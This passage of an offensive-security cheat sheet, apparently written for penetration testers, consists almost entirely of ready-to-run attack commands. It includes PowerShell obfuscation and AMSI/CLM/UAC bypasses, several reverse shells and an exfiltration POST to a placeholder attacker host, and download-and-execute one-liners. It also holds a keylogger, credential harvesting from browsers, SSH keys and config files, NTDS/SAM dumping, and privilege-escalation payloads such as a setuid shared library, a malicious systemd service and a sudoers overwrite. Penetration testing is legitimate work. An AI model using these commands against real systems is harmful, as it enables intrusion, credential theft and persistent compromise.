PS C:\> $originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); Invoke-Expression $decodedString
```

### Command Aliasing

```c
PS C:\> $alias = 'Get-Dir'; Set-Alias -Name $alias -Value Get-ChildItem; Invoke-Expression $alias
```

### Variable Name Obfuscation

```c
PS C:\> $o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd
```

### File Path Obfuscation

```c
PS C:\> $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path
```

### Using Alternate Data Streams for Evasion

```c
PS C:\> $content = 'Invoke-Mimikatz'; $file = 'C:\<FILE>.txt'; $stream = 'C:\<FILE>.txt:hidden'; Set-Content -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; Get-Content -Path $stream
```

### Bypassing Script Execution Policy

```c
PS C:\> $policy = Get-ExecutionPolicy; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; # Run your script here; Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process
```

### In-Memory Script Execution

```c
PS C:\> $code = [System.IO.File]::ReadAllText('C:\<FILE>.ps1'); Invoke-Expression $code
```

### Dynamic Invocation with Reflection

```c
PS C:\> $assembly = [Reflection.Assembly]::LoadWithPartialName('System.Management'); $type = $assembly.GetType('System.Management.ManagementObjectSearcher'); $constructor = $type.GetConstructor(@([string])); $instance = $constructor.Invoke(@('SELECT * FROM Win32_Process')); $method = $type.GetMethod('Get'); $result = $method.Invoke($instance, @())
```

### Encoded Command Execution

```c
PS C:\> $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-Process')); powershell.exe -EncodedCommand $encodedCmd
```

### Utilizing PowerShell Runspaces for Evasion

```c
PS C:\> $runspace = [runspacefactory]::CreateRunspace(); $runspace.Open(); $pipeline = $runspace.CreatePipeline(); $pipeline.Commands.AddScript('Get-Process'); $results = $pipeline.Invoke(); $runspace.Close(); $results
```

### Environment Variable Obfuscation

```c
PS C:\> $env:PSVariable = 'Get-Process'; Invoke-Expression $env:PSVariable
```

### Function Renaming for Evasion

```c
PS C:\> Function MyGetProc { Get-Process }; MyGetProc
```

### Using PowerShell Classes for Code Hiding

```c
PS C:\> class HiddenCode { [string] Run() { return 'Hidden command executed' } }; $instance = [HiddenCode]::new(); $instance.Run()
```

### Registry Key Usage for Persistence

```c
PS C:\> $path = 'HKCU:\Software\<FILE>'; New-Item -Path $path -Force; New-ItemProperty -Path $path -Name 'Config' -Value 'EncodedPayload' -PropertyType String -Force; $regValue = Get-ItemProperty -Path $path -Name 'Config'; Invoke-Expression $regValue.Config
```

### Out-Of-Band Data Exfiltration

```c
PS C:\> $data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://<LHOST>/data' -Method Post -Body $data
```

### Using PowerShell to Access WMI for Stealth

```c
PS C:\> $query = 'SELECT * FROM Win32_Process'; Get-WmiObject -Query $query
```

### Scheduled Task for Persistence

```c
PS C:\> $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "<COMMAND>"'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName '<NAME>' -Description '<DESCRIPTION>'
```

### Using PowerShell to Interact with the Network Quietly

```c
PS C:\> $client = New-Object Net.Sockets.TcpClient('<LHOST>', 443); $stream = $client.GetStream(); # Send and receive data
```

### Base64 Encoding for Command Obfuscation

```c
PS C:\> $command = 'Get-Process'; $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)); powershell.exe -EncodedCommand $encodedCommand
```

### Utilizing PowerShell Add-Type for Code Execution

```c
PS C:\> Add-Type -TypeDefinition 'using System; public class <CLASS> { public static void Run() { Console.WriteLine("Executed"); } }'; [<CLASS>]::Run()
```

### Extracting Credentials from Windows Credential Manager

```c
PS C:\> $credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password
```

### Retrieving Passwords from Unsecured Files

```c
PS C:\> Select-String -Path C:\Users\*\Documents\*.txt -Pattern 'password' -CaseSensitive
```

### Dumping Credentials from Windows Services

```c
PS C:\> Get-WmiObject win32_service | Where-Object {$_.StartName -like '*@*'} | Select-Object Name, StartName, DisplayName
```

### Extracting Saved RDP Credentials

```c
PS C:\> cmdkey /list | Select-String 'Target: TERMSRV' | ForEach-Object { cmdkey /delete:($_ -split ' ')[-1] }
```

### Retrieving Browser Cookies for Credential Theft

```c
PS C:\> $env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Cookies' | Get-Item
```

### Extracting Credentials from IIS Application Pools

```c
PS C:\> Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessModel
```

### Reading Credentials from Configuration Files

```c
PS C:\> Get-ChildItem -Path C:\ -Include *.config -Recurse | Select-String -Pattern 'password='
```

### Dumping Credentials from Scheduled Tasks

```c
PS C:\> Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal
```

### Extracting SSH Keys from User Directories

```c
PS C:\> Get-ChildItem -Path C:\Users\*\.ssh\id_rsa -Recurse
```

### Retrieving Credentials from Database Connection Strings

```c
PS C:\> Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString' -CaseSensitive
```

### Simple PowerShell Reverse Shell

```c
PS C:\> $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()
```

### HTTP-Based PowerShell Reverse Shell

```c
PS C:\> while($true) { try { $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() } catch { Start-Sleep -Seconds 10 } }
```

### WebSocket-Based PowerShell Reverse Shell

```c
PS C:\> $ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri("ws://<LHOST>:<LPORT>"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
```

### DNS-Based PowerShell Reverse Shell

```c
PS C:\> function Invoke-DNSReverseShell { param([string]$<LHOST>, [int]$<LPORT>) $client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); nslookup $encodedSendback $attacker_ip; $stream.Flush()}; $client.Close() }
```

### Encrypted PowerShell Reverse Shell

```c
PS C:\> $ErrorActionPreference = 'SilentlyContinue'; $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = $client.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream, $false, {$true} ); $sslStream.AuthenticateAsClient('<LHOST>'); $writer = New-Object System.IO.StreamWriter($sslStream); $reader = New-Object System.IO.StreamReader($sslStream); while($true) { $writer.WriteLine('PS ' + (pwd).Path + '> '); $writer.Flush(); $command = $reader.ReadLine(); if($command -eq 'exit') { break; }; $output = iex $command 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() }; $client.Close()
```

### Invoke Windows API for Keylogging

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); } "@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }
```

### Accessing Physical Memory with Windows API

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class MemoryReader { [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead); } "@ $process = Get-Process -Name 'process_name' $handle = $process.Handle $buffer = New-Object byte[] 1024 $bytesRead = 0 [MemoryReader]::ReadProcessMemory($handle, [IntPtr]0x00000000, $buffer, $buffer.Length, [ref]$bytesRead)
```

### Using Windows API for Screen Capturing

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow(); [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } "@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here
```

### Manipulating Windows Services via API

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class ServiceManager { [DllImport("advapi32.dll", SetLastError = true)] public static extern IntPtr OpenSCManager(string lpMachineName, string lpSCDB, int scParameter); [DllImport("advapi32.dll", SetLastError = true)] public static extern IntPtr CreateService(IntPtr SC_HANDLE, string lpSvcName, string lpDisplayName, int dwDesiredAccess, int dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lp, string lpPassword); [DllImport("advapi32.dll", SetLastError = true)] public static extern bool StartService(IntPtr SVHANDLE, int dwNumServiceArgs, string lpServiceArgVectors); } "@ $scManagerHandle = [ServiceManager]::OpenSCManager(null, null, 0xF003F) # Further code to create, modify, or start services goes here
```

### Windows API for Clipboard Access

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; using System.Text; public class ClipboardAPI { [DllImport("user32.dll")] public static extern bool OpenClipboard(IntPtr hWndNewOwner); [DllImport("user32.dll")] public static extern bool CloseClipboard(); [DllImport("user32.dll")] public static extern IntPtr GetClipboardData(uint uFormat); [DllImport("kernel32.dll")] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport("kernel32.dll")] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport("kernel32.dll")] public static extern int GlobalSize(IntPtr hMem); } "@ [ClipboardAPI]::OpenClipboard([IntPtr]::Zero) $clipboardData = [ClipboardAPI]::GetClipboardData(13) # CF_TEXT format $gLock = [ClipboardAPI]::GlobalLock($clipboardData) $size = [ClipboardAPI]::GlobalSize($clipboardData) $buffer = New-Object byte[] $size [System.Runtime.InteropServices.Marshal]::Copy($gLock, $buffer, 0, $size) [ClipboardAPI]::GlobalUnlock($gLock) [ClipboardAPI]::CloseClipboard() [System.Text.Encoding]::Default.GetString($buffer)
```

### Finding Writable and Executable Memory

```c
PS C:\> $proc = Get-NtProcess -ProcessId $pid -Access QueryLimitedInformation Get-NtVirtualMemory -Process $proc | Where-Object { $_.Protect -band "ExecuteReadWrite" }
```

### Finding Shared Section Handles

```c
PS C:\> $ss = Get-NtHandle -ObjectType Section -GroupByAddress | Where-Object ShareCount -eq 2 $mask = Get-NtAccessMask -SectionAccess MapWrite $ss = $ss | Where-Object { Test-NtAccessMask $_.AccessIntersection $mask } foreach($s in $ss) { $count = ($s.ProcessIds | Where-Object { Test-NtProcess -ProcessId $_ -Access DupHandle }).Count if ($count -eq 1) { $s.Handles | Select ProcessId, ProcessName, Handle } }
```

### Modifying a Mapped Section

```c
PS C:\> $sect = $handle.GetObject() $map = Add-NtSection -Section $sect -Protection ReadWrite $random = Get-RandomByte -Size $map.Length Write-NtVirtualMemory -Mapping $map -Data $random
```

### Process Creation and Command Line Parsing

```c
PS C:\> $proc = New-Win32Process -CommandLine "notepad <FILE>.txt"
```

### Security Implications of Command Line Parsing

```c
PS C:\> $proc = New-Win32Process -CommandLine "notepad <FILE>.txt" -ApplicationName "c:\windows\notepad.exe"
```

### Using Shell APIs for Non-Executable Files

```c
PS C:\> Start-Process "<FILE>.txt" -Verb "print"
```

### Querying Service Status with PowerShell

```c
PS C:\> Get-Win32Service
```

### Finding Executables That Import Specific APIs

```c
PS C:\> $imps = ls "$env:WinDir\*.exe" | ForEach-Object { Get-Win32ModuleImport -Path $_.FullName } PS> $imps | Where-Object Names -Contains "CreateProcessW" | Select-Object ModulePath
```

### Finding Hidden Registry Keys or Values

```c
PS C:\> ls NtKeyUser:\SOFTWARE -Recurse | Where-Object Name -Match "`0"
PS C:\> Get-NtTokenPrivilege $token
```

## PowerShell Constrained Language Mode (CLM)

```c
PS C:\> Get-ApplockerPolicy -Effective -xml
PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Bypass Test

```c
PS C:\> $a = Get-ApplockerPolicy -effective
PS C:\> $a.rulecollections
```

### Bypass

```c
PS C:\> $ExecutionContext.SessionState.LanguageMode
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<RHOST>/<FILE>.ps1')
```

```c
PS C:\> powershell -version 2
```

#### Example

```c
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<RHOST>/Invoke-Rubeus.ps1'); Invoke-Rubeus.ps1
```

### Execute Code in another User Context

```c
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword); Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock { <COMMAND> }
```

### Decrypt Encrypted Credentials XML for PowerShell

#### Manual Steps

```c
PS C:\> [xml]$xmlContent = Get-Content -Path "C:\PATH\TO\FILE\Credentials.xml"
PS C:\> $encryptedPassword = $xmlContent.Objs.Obj.Props.SS.'#text'
PS C:\> $securePassword = $encryptedPassword | ConvertTo-SecureString
PS C:\> $username = $xmlContent.Objs.Obj.Props.S.'#text'
PS C:\> $credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
PS C:\> $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password)
PS C:\> $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
PS C:\> Write-Output $plainPassword
```

#### One-Liner

```c
PS C:\> $cred = Import-CliXml -Path Credentials.xml; $cred.GetNetworkCredential() | Format-List *
```

## PowerSploit

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

### Import

```c
PS C:\> Import-Module .\PowerView.ps1
```

or

```c
PS C:\> iex(new-object net.webclient).downloadstring('http://<LHOST>/PowerView.ps1')
```

### Set Credentials

```c
PS C:\> $SecPass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force 
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\LDAP', $SecPass)
```

### Example

```c
PS C:\> Get-DomainUser -Credential $cred -DomainController dc.<DOMAIN>
```

## PowerView

> https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

```c
PS C:\> curl http://<LHOST>/PowerView.ps1 | iex
```

## Pre-created Computer Accounts

> https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/

```c
$ changepasswd.py -protocol rpc-samr -newpass <PASSWORD> '<DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>'
```

## PRET

> https://github.com/RUB-NDS/PRET

```c
$ ./pret.py
$ ./pret.py <RHOST> ps    // pjl
```

```c
<RHOST>:/> ls
<RHOST>:/> cd
<RHOST>:/> get
<RHOST>:/> nvram dump
```

## procdump

```c
PS C:\> .\procdump64.exe -accepteula -ma <PID>
PS C:\> type <FILE>.dmp | Select-String "username="
```

## PsExec

```c
PS C:\> .\psexec.exe -hashes :<HASH> administrator@127.0.0.1 "<COMMAND>"
```

## pspy

>  https://github.com/DominicBreuker/pspy

```c
$ pspy64 -f
$ pspy64 -pf -i 1000
```

## pth-toolkit

> https://github.com/byt3bl33d3r/pth-toolkit

```c
$ pth-smbclient --user=<USERNAME> --pw-nt-hash -m smb3 \\\\<RHOST>\\<USERNAME> <HASH>
$ pth-net rpc password --pw-nt-hash <USERNAME> -U <DOMAIN>/<COMPUTERNAME>%<HASH> -S <RHOST>
```

## pwncat

> https://github.com/calebstewart/pwncat

> https://pwncat.readthedocs.io/en/latest/usage.html

### Common Commands

```c
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```

```c
$ pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```

## pyGPOAbuse

> https://github.com/Hackndo/pyGPOAbuse

```c
$ python3 pygpoabuse.py <DOMAIN>/<USERNAME> -hashes :<HASH> -gpo-id "<GPO_ID>" -dc-ip <RHOST>
```

## Python

### System Shell

```c
$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Python Library Hijacking

> https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

> https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7

### Get the current Path

```c
$ python3 -c 'import sys;print(sys.path)'
```

### remoteshell.py

```c
import os
os.system("nc -lnvp <LPORT> -e /bin/bash")
```

### Include Path

```c
$ sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
```

## rbash

### Restricted Bash (rbash) Breakouts

#### Environment Enumeration

```c
$ export -p
$ env
$ echo $0
$ echo $PATH
```

#### Checking $PATH Variable

```c
$ ls /home/<USERNAME>/usr/bin
$ echo /home/<USERNAME>/usr/bin/*
```

#### Breakout using $PATH Variable

```c
$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

#### Breakout using GTFObins

- less
- ls
- scp
- vi

##### Examples using less

```c
$ less /etc/profile
!/bin/sh
```

```c
$ VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```

```c
$ less /etc/profile
v:shell
```

##### Example using scp

```c
$ TF=$(mktemp)
$ echo 'sh 0<&2 1>&2' > $TF
$ chmod +x "$TF"
$ scp -S $TF x y:
```

##### Examples using vi

```c
$ vi -c ':!/bin/sh' /dev/null
```

```c
$ vi
:set shell=/bin/sh
:shell
```

#### Breackout using SSH Command Execution

```c
$ ssh <USERNAME>@<RHOST> -t sh
$ ssh <USERNAME>@<RHOST> -t /bin/sh
$ ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
```

## relayd

### Prerequisites

The binary need to have the `SUID` bit set.

```c
$ /usr/sbin/relayd -C /etc/shadow
[ERR] 2023-09-27 14:18:13 config.cpp:1539 write
[ERR] 2023-09-27 14:18:13 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2023-09-27 14:18:13 config.cpp:1189 bad json format [/etc/shadow]
[ERR] 2023-09-27 14:18:13 invalid config file
```

## rpcclient

### LDAP

```c
$ rpcclient -U "" <RHOST>
```

#### Queries

```c
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdata
enumdomgroups
enumdomusers
enumjobs
enumports
enumprivs
getanydcname
getdcname
lookupsids
lsaenumsid <SID>
lsaquery
netconnenum
netdiskenum
netfileenum
netsessenum
netshareenum
netshareenumall
netsharegetinfo
queryuser <USERNAME>
srvinfo
```

## Rubeus

> https://github.com/GhostPack/Rubeus

### Overpass the Hash

```c
PS C:\> Rubeus.exe kerberoast /user:<USERNAME>
```

### Pass the Hash

```c
PS C:\> .\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

### .NET Reflection

#### Example

```c
$ base64 Rubeus.exe -w0 > <FILE>.txt
```

```c
PS C:\> $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String((new-object net.webclient).downloadstring('http://<RHOST>/<FILE>.txt')))
```

```c
PS C:\> [Rubeus.Program]::MainString("kerberoast /creduser:<DOMAIN>\<USERNAME> /credpassword:<PASSWORD>")
```

## RunasCs

> https://github.com/antonioCoco/RunasCs

```c
C:\> .\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
C:\> .\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
C:\> .\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
```

## SeBackupPrivilege Privilege Escalation (diskshadow)

> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

### Script for PowerShell Environment

```c
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```

```c
PS C:\> diskshadow /s <FILE>.txt
```

### Copy ntds.dit

```c
PS C:\> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

### Export System Registry Value

```c
PS C:\> reg save HKLM\SYSTEM c:\temp\system
```

### Extract the Hashes

```c
$ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

### Alternative Way via Robocopy

```c
C:\> reg save hklm\sam C:\temp\sam
C:\> reg save hklm\system C:\temp\system
```

```c
set metadata C:\Windows\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
 
```c
C:\temp\> diskshadow /s script.txt
C:\temp\> robocopy /b E:\Windows\ntds . ntds.dit
```

```c
$ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

## setcap

```c
$ setcap cap_setgid,cap_setuid+eip <FILE>
```

## Shared Library Misconfiguration

> https://tbhaxor.com/exploiting-shared-library-misconfigurations/

### shell.c

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

### Compiling

```c
$ gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
```

## SharpDPAPI

```c
PS C:\> .\SharpDPAPI.exe triage
PS C:\> .\SharpDPAPI.exe masterkeys /rpc
```

## SharpHound

>  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe

```c
PS C:\> .\SharpHound.exe --CollectionMethod All
```

## Shell Upgrade

```c
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

or

```c
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```c
$ Ctrl + z
$ stty raw -echo
fg
Enter
Enter
$ export XTERM=xterm
```

Alternatively:

```c
$ script -q /dev/null -c bash
$ /usr/bin/script -qc /bin/bash /dev/null
```

### Oneliner

```c
$ stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

### Fixing Staircase Effect

```c
$ env reset
```

or

```c
$ stty onlcr
```

## Sherlock

> https://github.com/rasta-mouse/Sherlock

### Config

Add `Find-AllVulns` at the end of the script to run it as soon as it get's loaded.

```c
            10586 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 19 ] }
            14393 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 446 ] }
            default { $VulnStatus = "Not Vulnerable" }

        }

    Set-ExploitTable $MSBulletin $VulnStatus

}
Find-AllVulns

$ IEX(New-Object Net.webclient).downloadString('http://<LHOST>/Sherlock.ps1')
```

## smbpasswd

```c
$ smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
```

## systemctl

### Malicious Service Privilege Escalation

#### Payload

```c
[Unit]
Description=Example Service

[Service]
Type=simple
ExecStart=chmod +s /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target

```

#### Installation

```c
$ echo '[Unit]
Description=Example Service

[Service]
Type=simple
ExecStart=chmod +s /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/<SERVICE>.service
```

#### Execution

```c
$ sudo systemctl restart <SERVICE>
```

## Time Stomping

```c
$dateTime = New-Object System.DateTime(1999,12,26)
$regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\helpsvc",$true)[RegRoutines.NativeMethods]::SetRegistryKeyDateTime($regKey, $dateTime)
```

## Universal Privilege Escalation and Persistence Printer

```c
$printerName     = 'Pentest Lab Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
```

```c
Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
```

```c
Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```

## User Account Control (UAC) Bypass

### With UI available

```c
PS C:\> Start-Process powershell -Verb runAs
PS C:\> Start-Process powershell -Verb runAs /user:<USERNAME> cmd.exe
```

### Using fodhelper.exe

> https://github.com/nobodyatall648/UAC_Bypass

```c
PS C:\> New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "C:\Users\<USERNAME>\Downloads\<FILE>" -Force
```

```c
PS C:\> New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
```

```c
PS C:\> Start-Process "C:\Windows\System32\fodhelper.exe"
```

## User Group Exploitation

> https://wixnic.github.io/linux-privesc-groups/

> https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/

### Possibilities

```c
- Edit /etc/passwd    // copy it to /tmp to edit
- Add new SSH Key to /root/
```

### Find modifyable Files

```c
$ find / -group root -perm -g=w ! -type l 2>/dev/null | grep -v 'proc\|sys' | xargs ls -l
```

### Option 1

```c
#!/usr/bin/env python
import os
import sys
try:
       os.system('cp /bin/sh /tmp/sh')
       os.system('chmod u+s /tmp/sh')
except:
       sys.exit()
```

### Option 2

```c
#!/usr/bin/env python
import os
import sys
try:
       os.system('echo "$USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers')
except:
       sys.exit()
```

## VSS

> https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators 

